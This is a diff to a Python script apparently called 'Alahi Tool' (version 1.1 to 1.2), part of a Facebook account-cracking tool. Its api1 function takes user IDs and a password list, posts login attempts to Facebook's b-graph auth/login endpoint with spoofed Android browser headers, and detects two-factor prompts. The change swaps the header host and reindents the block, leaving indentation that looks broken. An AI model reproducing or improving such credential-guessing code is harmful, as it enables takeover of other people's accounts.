@@ -178,7 +178,7 @@ logo=(f"""{GREEN}
 {WHITE}[•] AUTHOR       : Fazla Alahi
 [•] GitHub       : Fazla Alahi
 [•] FaceBook     : Fazla Alahi
-[•] Version      :   {GREEN}1.1
+[•] Version      :   {GREEN}1.2
 
 {WHITE}================================================
         \033[1;35m Welcome To Alahi Tool \33[0;m
@@ -695,27 +695,27 @@ def api1(ids,names,passlist):
                                 'client_country_code': 'US', 
                                 'fb_api_req_friendly_name': 'authenticate'
                                 }
-                        headers={
-                               'authority': 'm.facebook.com',
-                               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                               'accept-language': 'en-US,en;q=0.9',
-                               'cache-control': 'max-age=0',
-                               'dpr': '1.8000000715255737',
-                               'sec-ch-prefers-color-scheme': 'dark',
-                               'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-                               'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-                               'sec-ch-ua-mobile': '?1',
-                               'sec-ch-ua-model': '"RMX2101"',
-                               'sec-ch-ua-platform': '"Android"',
-                               'sec-ch-ua-platform-version': '"11.0.0"',
-                               'sec-fetch-dest': 'document',
-                               'sec-fetch-mode': 'navigate',
-                               'sec-fetch-site': 'none',
-                               'sec-fetch-user': '?1',
-                               'upgrade-insecure-requests': '1',
-                               'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-                               'viewport-width': '980',
-                         }
+     headers={
+                            'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '1.8000000715255737',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"RMX2101"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
